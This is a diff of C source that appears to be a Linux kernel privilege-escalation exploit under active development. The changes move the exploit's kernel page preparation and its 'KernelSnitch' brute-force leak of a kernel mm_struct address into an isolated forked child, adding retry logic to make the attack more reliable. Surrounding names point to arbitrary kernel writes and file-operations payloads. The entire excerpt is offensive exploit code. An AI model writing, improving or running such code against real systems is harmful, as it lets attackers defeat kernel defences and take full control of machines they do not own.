@@ -1119,12 +1119,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
-pid_t brute_child = fork();
-if (brute_child == 0) {
-    kernelsnitch_bruteforce(ks);
-    _exit(0);
-}
-SYSCHK(waitpid(brute_child, NULL, 0));
+kernelsnitch_bruteforce(ks);
 uintptr_t leaked = ks->mm_struct;
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
@@ -1450,27 +1445,52 @@ uintptr_t leaked = ks->mm_struct;
 }
 
 uintptr_t prepare_good_kernel_page(int payload_mode) {
-  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
-  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
-    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
-  }
-  for (int attempt = 1; attempt <= max_attempts; attempt++) {
-    size_t started_ns = gettime_ns();
-    uintptr_t base = prepare_kernel_page(payload_mode);
-    size_t elapsed_ms = (gettime_ns() - started_ns) / 1000000ULL;
-    pr_info("kernel page prepare mode=%d attempt=%d/%d elapsed_ms=%zu "
-            "base=%016zx\n",
-            payload_mode, attempt, max_attempts, elapsed_ms, base);
-    if (base) {
-      return base;
+    int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
+    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+        max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
+    } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
+        max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
     }
-    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
-               max_attempts);
-  }
-  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
-  return 0;
+    for (int attempt = 1; attempt <= max_attempts; attempt++) {
+        size_t started_ns = gettime_ns();
+
+        /* Run the entire kernel page preparation in an isolated child.
+         * The child has a fresh mm_struct, clean futex hash, and cold
+         * slab caches — exactly like the pipe.c path that works. */
+        int result_pipe[2];
+        SYSCHK(pipe(result_pipe));
+        pid_t child = SYSCHK(fork());
+        if (child == 0) {
+            SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+            if (getppid() == 1) {
+                _exit(1);
+            }
+            SYSCHK(close(result_pipe[0]));
+            uintptr_t base = prepare_kernel_page(payload_mode);
+            SYSCHK(write(result_pipe[1], &base, sizeof(base)));
+            _exit(0);
+        }
+
+        SYSCHK(close(result_pipe[1]));
+        uintptr_t base = 0;
+        ssize_t got = read(result_pipe[0], &base, sizeof(base));
+        SYSCHK(close(result_pipe[0]));
+
+        int status;
+        waitpid(child, &status, 0);
+
+        size_t elapsed_ms = (gettime_ns() - started_ns) / 1000000ULL;
+        pr_info("kernel page prepare mode=%d attempt=%d/%d elapsed_ms=%zu "
+                "base=%016zx\n",
+                payload_mode, attempt, max_attempts, elapsed_ms, base);
+        if (base) {
+            return base;
+        }
+        pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
+                   max_attempts);
+    }
+    pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
+    return 0;
 }
 
 ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
